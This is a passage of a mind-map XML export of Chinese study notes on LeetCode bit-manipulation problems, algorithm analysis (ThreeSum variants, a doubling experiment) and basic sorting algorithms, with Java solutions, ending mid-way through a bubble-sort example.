<node ID="ID_1310069867" CREATED="1754751555324" MODIFIED="1754751555325"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 数组中唯一一个不重复的元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      136. Single Number (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/single-number/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/single-number/description/">力扣</a>
    </p>
    <pre>Input: [4,1,2,1,2]
Output: 4</pre>
    <p>
      两个相同的数异或的结果为 0，对所有数进行异或操作，最后的结果就是单独出现的那个数。
    </p>
    <pre>public int singleNumber(int[] nums) {
    int ret = 0;
    for (int n : nums) ret = ret ^ n;
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1159238954" CREATED="1754751555325" MODIFIED="1754751555327"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 找出数组中缺失的那个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      268. Missing Number (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/missing-number/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/missing-number/description/">力扣</a>
    </p>
    <pre>Input: [3,0,1]
Output: 2</pre>
    <p>
      题目描述：数组元素在 0-n 之间，但是有一个数是缺失的，要求找到这个缺失的数。
    </p>
    <pre>public int missingNumber(int[] nums) {
    int ret = 0;
    for (int i = 0; i &lt; nums.length; i++) {
        ret = ret ^ i ^ nums[i];
    }
    return ret ^ nums.length;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_120749503" CREATED="1754751555327" MODIFIED="1754751555329"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 数组中不重复的两个元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      260. Single Number III (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/single-number-iii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/single-number-iii/description/">力扣</a>
    </p>
    <p>
      两个不相等的元素在位级表示上必定会有一位存在不同。
    </p>
    <p>
      将数组的所有元素异或得到的结果为不存在重复的两个元素异或的结果。
    </p>
    <p>
      diff &amp;= -diff 得到出 diff 最右侧不为 0 的位，也就是不存在重复的两个元素在位级表示上最右侧不同的那一位，利用这一位就可以将两个元素区分开来。
    </p>
    <pre>public int[] singleNumber(int[] nums) {
    int diff = 0;
    for (int num : nums) diff ^= num;
    diff &amp;= -diff;  // 得到最右一位
    int[] ret = new int[2];
    for (int num : nums) {
        if ((num &amp; diff) == 0) ret[0] ^= num;
        else ret[1] ^= num;
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1701480471" CREATED="1754751555329" MODIFIED="1754751555332"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 翻转一个数的比特位
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      190. Reverse Bits (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/reverse-bits/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/reverse-bits/description/">力扣</a>
    </p>
    <pre>public int reverseBits(int n) {
    int ret = 0;
    for (int i = 0; i &lt; 32; i++) {
        ret &lt;&lt;= 1;
        ret |= (n &amp; 1);
        n &gt;&gt;&gt;= 1;
    }
    return ret;
}</pre>
    <p>
      如果该函数需要被调用很多次，可以将 int 拆成 4 个 byte，然后缓存 byte 对应的比特位翻转，最后再拼接起来。
    </p>
    <pre>private static Map&lt;Byte, Integer&gt; cache = new HashMap&lt;&gt;();
public int reverseBits(int n) {
    int ret = 0;
    for (int i = 0; i &lt; 4; i++) {
        ret &lt;&lt;= 8;
        ret |= reverseByte((byte) (n &amp; 0b11111111));
        n &gt;&gt;= 8;
    }
    return ret;
}
private int reverseByte(byte b) {
    if (cache.containsKey(b)) return cache.get(b);
    int ret = 0;
    byte t = b;
    for (int i = 0; i &lt; 8; i++) {
        ret &lt;&lt;= 1;
        ret |= t &amp; 1;
        t &gt;&gt;= 1;
    }
    cache.put(b, ret);
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1529006295" CREATED="1754751555332" MODIFIED="1754751555334"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 不用额外变量交换两个整数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E4%BD%8D%E8%BF%90%E7%AE%97.md#">程序员代码面试指南 ：P317</a>
    </p>
    <pre>a = a ^ b;
b = a ^ b;
a = a ^ b;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1581821359" CREATED="1754751555334" MODIFIED="1754751555336"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 判断一个数是不是 2 的 n 次方
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      231. Power of Two (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/power-of-two/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/power-of-two/description/">力扣</a>
    </p>
    <p>
      二进制表示只有一个 1 存在。
    </p>
    <pre>public boolean isPowerOfTwo(int n) {
    return n &gt; 0 &amp;&amp; Integer.bitCount(n) == 1;
}</pre>
    <p>
      利用 1000 &amp; 0111 == 0 这种性质，得到以下解法：
    </p>
    <pre>public boolean isPowerOfTwo(int n) {
    return n &gt; 0 &amp;&amp; (n &amp; (n - 1)) == 0;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1519588196" CREATED="1754751555336" MODIFIED="1754751555339"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 判断一个数是不是 4 的 n 次方
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      342. Power of Four (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/power-of-four/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/power-of-four/">力扣</a>
    </p>
    <p>
      这种数在二进制表示中有且只有一个奇数位为 1，例如 16（10000）。
    </p>
    <pre>public boolean isPowerOfFour(int num) {
    return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0 &amp;&amp; (num &amp; 0b01010101010101010101010101010101) != 0;
}</pre>
    <p>
      也可以使用正则表达式进行匹配。
    </p>
    <pre>public boolean isPowerOfFour(int num) {
    return Integer.toString(num, 4).matches(&quot;10*&quot;);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_688852528" CREATED="1754751555340" MODIFIED="1754751555343"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 判断一个数的位级表示是否不会出现连续的 0 和 1
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      693. Binary Number with Alternating Bits (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/binary-number-with-alternating-bits/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/binary-number-with-alternating-bits/description/">力扣</a>
    </p>
    <pre>Input: 10
Output: True
Explanation:
The binary representation of 10 is: 1010.
Input: 11
Output: False
Explanation:
The binary representation of 11 is: 1011.</pre>
    <p>
      对于 1010 这种位级表示的数，把它向右移动 1 位得到 101，这两个数每个位都不同，因此异或得到的结果为 1111。
    </p>
    <pre>public boolean hasAlternatingBits(int n) {
    int a = (n ^ (n &gt;&gt; 1));
    return (a &amp; (a + 1)) == 0;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_30105674" CREATED="1754751555343" MODIFIED="1754751555345"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 求一个数的补码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      476. Number Complement (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/number-complement/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/number-complement/description/">力扣</a>
    </p>
    <pre>Input: 5
Output: 2
Explanation: The binary representation of 5 is 101 (no leading zero bits), and its complement is 010. So you need to output 2.</pre>
    <p>
      题目描述：不考虑二进制表示中的首 0 部分。
    </p>
    <p>
      对于 00000101，要求补码可以将它与 00000111 进行异或操作。那么问题就转换为求掩码 00000111。
    </p>
    <pre>public int findComplement(int num) {
    if (num == 0) return 1;
    int mask = 1 &lt;&lt; 30;
    while ((num &amp; mask) == 0) mask &gt;&gt;= 1;
    mask = (mask &lt;&lt; 1) - 1;
    return num ^ mask;
}</pre>
    <p>
      可以利用 Java 的 Integer.highestOneBit() 方法来获得含有首 1 的数。
    </p>
    <pre>public int findComplement(int num) {
    if (num == 0) return 1;
    int mask = Integer.highestOneBit(num);
    mask = (mask &lt;&lt; 1) - 1;
    return num ^ mask;
}</pre>
    <p>
      对于 10000000 这样的数要扩展成 11111111，可以利用以下方法：
    </p>
    <pre>mask |= mask &gt;&gt; 1    11000000
mask |= mask &gt;&gt; 2    11110000
mask |= mask &gt;&gt; 4    11111111</pre>
    <pre>public int findComplement(int num) {
    int mask = num;
    mask |= mask &gt;&gt; 1;
    mask |= mask &gt;&gt; 2;
    mask |= mask &gt;&gt; 4;
    mask |= mask &gt;&gt; 8;
    mask |= mask &gt;&gt; 16;
    return (mask ^ num);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_541679271" CREATED="1754751555346" MODIFIED="1754751555347"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      11. 实现整数的加法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      371. Sum of Two Integers (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/sum-of-two-integers/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/sum-of-two-integers/description/">力扣</a>
    </p>
    <p>
      a ^ b 表示没有考虑进位的情况下两数的和，(a &amp; b) \&lt;\&lt; 1 就是进位。
    </p>
    <p>
      递归会终止的原因是 (a &amp; b) \&lt;\&lt; 1 最右边会多一个 0，那么继续递归，进位最右边的 0 会慢慢增多，最后进位会变为 0，递归终止。
    </p>
    <pre>public int getSum(int a, int b) {
    return b == 0 ? a : getSum((a ^ b), (a &amp; b) &lt;&lt; 1);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1647331942" CREATED="1754751555348" MODIFIED="1754751555350"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      12. 字符串数组最大乘积
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      318. Maximum Product of Word Lengths (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/maximum-product-of-word-lengths/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/maximum-product-of-word-lengths/description/">力扣</a>
    </p>
    <pre>Given [&quot;abcw&quot;, &quot;baz&quot;, &quot;foo&quot;, &quot;bar&quot;, &quot;xtfn&quot;, &quot;abcdef&quot;]
Return 16
The two words can be &quot;abcw&quot;, &quot;xtfn&quot;.</pre>
    <p>
      题目描述：字符串数组的字符串只含有小写字符。求解字符串数组中两个字符串长度的最大乘积，要求这两个字符串不能含有相同字符。
    </p>
    <p>
      本题主要问题是判断两个字符串是否含相同字符，由于字符串只含有小写字符，总共 26 位，因此可以用一个 32 位的整数来存储每个字符是否出现过。
    </p>
    <pre>public int maxProduct(String[] words) {
    int n = words.length;
    int[] val = new int[n];
    for (int i = 0; i &lt; n; i++) {
        for (char c : words[i].toCharArray()) {
            val[i] |= 1 &lt;&lt; (c - 'a');
        }
    }
    int ret = 0;
    for (int i = 0; i &lt; n; i++) {
        for (int j = i + 1; j &lt; n; j++) {
            if ((val[i] &amp; val[j]) == 0) {
                ret = Math.max(ret, words[i].length() * words[j].length());
            }
        }
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1158553249" CREATED="1754751555350" MODIFIED="1754751555352"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      13. 统计从 0 ~ n 每个数的二进制表示中 1 的个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      338. Counting Bits (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/counting-bits/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/counting-bits/description/">力扣</a>
    </p>
    <p>
      对于数字 6(110)，它可以看成是 4(100) 再加一个 2(10)，因此 dp[i] = dp[i&amp;(i-1)] + 1;
    </p>
    <pre>public int[] countBits(int num) {
    int[] ret = new int[num + 1];
    for(int i = 1; i &lt;= num; i++){
        ret[i] = ret[i&amp;(i-1)] + 1;
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_1080991830" CREATED="1754750422729" MODIFIED="1754750422731"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Leetcode
      </li>
      <li>
        Weiss M A, 冯舜玺. 数据结构与算法分析——C 语言描述[J]. 2004.
      </li>
      <li>
        Sedgewick R. Algorithms[M]. Pearson Education India, 1988.
      </li>
      <li>
        何海涛, 软件工程师. 剑指 Offer: 名企面试官精讲典型编程题[M]. 电子工业出版社, 2014.
      </li>
      <li>
        《编程之美》小组. 编程之美[M]. 电子工业出版社, 2008.
      </li>
      <li>
        左程云. 程序员代码面试指南[M]. 电子工业出版社, 2015.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1847142240" CREATED="1754749800769" MODIFIED="1754750433509" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E7%9B%AE%E5%BD%95.md" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      算法
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1836681706" CREATED="1754750433494" MODIFIED="1754751589344" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    算法分析
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1798200654" CREATED="1754751589346" MODIFIED="1754751589346"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数学模型
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_11838314" CREATED="1754751589348" MODIFIED="1754751589350"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 近似
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      N<sup>3</sup>/6-N<sup>2</sup>/2+N/3 ~ N<sup>3</sup>/6。使用 ~f(N) 来表示所有随着 N 的增大除以 f(N) 的结果趋近于 1 的函数。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_734973406" CREATED="1754751589350" MODIFIED="1754751589353"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 增长数量级
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      N<sup>3</sup>/6-N<sup>2</sup>/2+N/3 的增长数量级为 O(N<sup>3</sup>)。增长数量级将算法与它的具体实现隔离开来，一个算法的增长数量级为 O(N<sup>3</sup>) 与它是否用 Java 实现，是否运行于特定计算机上无关。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1406013158" CREATED="1754751589353" MODIFIED="1754751589355"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 内循环
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      执行最频繁的指令决定了程序执行的总时间，把这些指令称为程序的内循环。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_544389404" CREATED="1754751589355" MODIFIED="1754751589357"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 成本模型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      使用成本模型来评估算法，例如数组的访问次数就是一种成本模型。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_687157318" CREATED="1754751589357" MODIFIED="1754751589357"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      注意事项
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_806018457" CREATED="1754751589359" MODIFIED="1754751589361"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 大常数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      在求近似时，如果低级项的常数系数很大，那么近似的结果是错误的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1503042015" CREATED="1754751589361" MODIFIED="1754751589364"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      计算机系统会使用缓存技术来组织内存，访问数组相邻的元素会比访问不相邻的元素快很多。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_269900299" CREATED="1754751589364" MODIFIED="1754751589366"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 对最坏情况下的性能的保证
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      在核反应堆、心脏起搏器或者刹车控制器中的软件，最坏情况下的性能是十分重要的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1288313248" CREATED="1754751589367" MODIFIED="1754751589369"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 随机化算法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      通过打乱输入，去除算法对输入的依赖。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_642598548" CREATED="1754751589369" MODIFIED="1754751589372"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 均摊分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      将所有操作的总成本除于操作总数来将成本均摊。例如对一个空栈进行 N 次连续的 push() 调用需要访问数组的次数为 N+4+8+16+...+2N=5N-4（N 是向数组写入元素的次数，其余都是调整数组大小时进行复制需要的访问数组次数），均摊后访问数组的平均次数为常数。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1273137970" CREATED="1754751589373" MODIFIED="1754751589375"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ThreeSum
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      ThreeSum 用于统计一个数组中和为 0 的三元组数量。
    </p>
    <pre>public interface ThreeSum {
    int count(int[] nums);
}</pre>
  </body>
</html></richcontent>
<node ID="ID_664168192" CREATED="1754751589375" MODIFIED="1754751589377"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. ThreeSumSlow
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      该算法的内循环为 <code>if (nums[i] + nums[j] + nums[k] == 0)</code>&#xa0;语句，总共执行的次数为 N(N-1)(N-2) = N<sup>3</sup>/6-N<sup>2</sup>/2+N/3，因此它的近似执行次数为 ~N<sup>3</sup>/6，增长数量级为 O(N<sup>3</sup>)。
    </p>
    <pre>public class ThreeSumSlow implements ThreeSum {
    @Override
    public int count(int[] nums) {
        int N = nums.length;
        int cnt = 0;
        for (int i = 0; i &lt; N; i++) {
            for (int j = i + 1; j &lt; N; j++) {
                for (int k = j + 1; k &lt; N; k++) {
                    if (nums[i] + nums[j] + nums[k] == 0) {
                        cnt++;
                    }
                }
            }
        }
        return cnt;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1978698003" CREATED="1754751589378" MODIFIED="1754751589380"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. ThreeSumBinarySearch
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      将数组进行排序，对两个元素求和，并用二分查找方法查找是否存在该和的相反数，如果存在，就说明存在和为 0 的三元组。
    </p>
    <p>
      应该注意的是，只有数组不含有相同元素才能使用这种解法，否则二分查找的结果会出错。
    </p>
    <p>
      该方法可以将 ThreeSum 算法增长数量级降低为 O(N<sup>2</sup>logN)。
    </p>
    <pre>public class ThreeSumBinarySearch implements ThreeSum {
    @Override
    public int count(int[] nums) {
        Arrays.sort(nums);
        int N = nums.length;
        int cnt = 0;
        for (int i = 0; i &lt; N; i++) {
            for (int j = i + 1; j &lt; N; j++) {
                int target = -nums[i] - nums[j];
                int index = BinarySearch.search(nums, target);
                // 应该注意这里的下标必须大于 j，否则会重复统计。
                if (index &gt; j) {
                    cnt++;
                }
            }
        }
        return cnt;
    }
}</pre>
    <pre>public class BinarySearch {
    public static int search(int[] nums, int target) {
        int l = 0, h = nums.length - 1;
        while (l &lt;= h) {
            int m = l + (h - l) / 2;
            if (target == nums[m]) {
                return m;
            } else if (target &gt; nums[m]) {
                l = m + 1;
            } else {
                h = m - 1;
            }
        }
        return -1;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_721207038" CREATED="1754751589380" MODIFIED="1754751589384"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. ThreeSumTwoPointer
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      更有效的方法是先将数组排序，然后使用双指针进行查找，时间复杂度为 O(N<sup>2</sup>)。
    </p>
    <p>
      同样不适用与数组存在重复元素的情况。
    </p>
    <pre>public class ThreeSumTwoPointer implements ThreeSum {
    @Override
    public int count(int[] nums) {
        int N = nums.length;
        int cnt = 0;
        Arrays.sort(nums);
        for (int i = 0; i &lt; N - 2; i++) {
            int l = i + 1, h = N - 1, target = -nums[i];
            while (l &lt; h) {
                int sum = nums[l] + nums[h];
                if (sum == target) {
                    cnt++;
                    l++;
                    h--;
                } else if (sum &lt; target) {
                    l++;
                } else {
                    h--;
                }
            }
        }
        return cnt;
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1670279538" CREATED="1754751589385" MODIFIED="1754751589388"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      倍率实验
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      如果 T(N) ~ aN<sup>b</sup>logN，那么 T(2N)/T(N) ~ 2<sup>b</sup>。
    </p>
    <p>
      例如对于暴力的 ThreeSum 算法，近似时间为 ~N<sup>3</sup>/6。进行如下实验：多次运行该算法，每次取的 N 值为前一次的两倍，统计每次执行的时间，并统计本次运行时间与前一次运行时间的比值，得到如下结果：
    </p>
    <table>
      <tr>
        <th>
          N
        </th>
        <th>
          Time(ms)
        </th>
        <th>
          Ratio
        </th>
      </tr>
      <tr>
        <td>
          500
        </td>
        <td>
          48
        </td>
        <td>
          /
        </td>
      </tr>
      <tr>
        <td>
          1000
        </td>
        <td>
          320
        </td>
        <td>
          6.7
        </td>
      </tr>
      <tr>
        <td>
          2000
        </td>
        <td>
          555
        </td>
        <td>
          1.7
        </td>
      </tr>
      <tr>
        <td>
          4000
        </td>
        <td>
          4105
        </td>
        <td>
          7.4
        </td>
      </tr>
      <tr>
        <td>
          8000
        </td>
        <td>
          33575
        </td>
        <td>
          8.2
        </td>
      </tr>
      <tr>
        <td>
          16000
        </td>
        <td>
          268909
        </td>
        <td>
          8.0
        </td>
      </tr>
    </table>
    <p>
      可以看到，T(2N)/T(N) ~ 2<sup>3</sup>，因此可以确定 T(N) ~ aN<sup>3</sup>logN。
    </p>
    <pre>public class RatioTest {
    public static void main(String[] args) {
        int N = 500;
        int loopTimes = 7;
        double preTime = -1;
        while (loopTimes-- &gt; 0) {
            int[] nums = new int[N];
            StopWatch.start();
            ThreeSum threeSum = new ThreeSumSlow();
            int cnt = threeSum.count(nums);
            System.out.println(cnt);
            double elapsedTime = StopWatch.elapsedTime();
            double ratio = preTime == -1 ? 0 : elapsedTime / preTime;
            System.out.println(N + &quot;  &quot; + elapsedTime + &quot;  &quot; + ratio);
            preTime = elapsedTime;
            N *= 2;
        }
    }
}</pre>
    <pre>public class StopWatch {
    private static long start;
    public static void start() {
        start = System.currentTimeMillis();
    }
    public static double elapsedTime() {
        long now = System.currentTimeMillis();
        return (now - start) / 1000.0;
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_542585751" CREATED="1754750433497" MODIFIED="1754751610656" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E6%8E%92%E5%BA%8F.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    排序
  </body>
</html>
</richcontent>
<node ID="ID_825947942" CREATED="1754751610658" MODIFIED="1754751610661"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      约定
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      待排序的元素需要实现 Java 的 Comparable 接口，该接口有 compareTo() 方法，可以用它来判断两个元素的大小关系。
    </p>
    <p>
      使用辅助函数 less() 和 swap() 来进行比较和交换的操作，使得代码的可读性和可移植性更好。
    </p>
    <p>
      排序算法的成本模型是比较和交换的次数。
    </p>
    <pre>public abstract class Sort&lt;T extends Comparable&lt;T&gt;&gt; {
    public abstract void sort(T[] nums);
    protected boolean less(T v, T w) {
        return v.compareTo(w) &lt; 0;
    }
    protected void swap(T[] a, int i, int j) {
        T t = a[i];
        a[i] = a[j];
        a[j] = t;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1644317203" CREATED="1754751610661" MODIFIED="1754751610663"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      选择排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      从数组中选择最小元素，将它与数组的第一个元素交换位置。再从数组剩下的元素中选择出最小的元素，将它与数组的第二个元素交换位置。不断进行这样的操作，直到将整个数组排序。
    </p>
    <p>
      选择排序需要 ~N<sup>2</sup>/2 次比较和 ~N 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要这么多的比较和交换操作。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bc6be2d0-ed5e-4def-89e5-3ada9afa811a.gif" width="230px"/>
    <br/>
    

    <pre>public class Selection&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
        int N = nums.length;
        for (int i = 0; i &lt; N - 1; i++) {
            int min = i;
            for (int j = i + 1; j &lt; N; j++) {
                if (less(nums[j], nums[min])) {
                    min = j;
                }
            }
            swap(nums, i, min);
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_489031594" CREATED="1754751610664" MODIFIED="1754751610668"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      冒泡排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      从左到右不断交换相邻逆序的元素，在一轮的循环之后，可以让未排序的最大元素上浮到右侧。
    </p>
    <p>
      在一轮循环中，如果没有发生交换，那么说明数组已经是有序的，此时可以直接退出。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0f8d178b-52d8-491b-9dfd-41e05a952578.gif" width="200px"/>
    <br/>
    

    <pre>public class Bubble&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
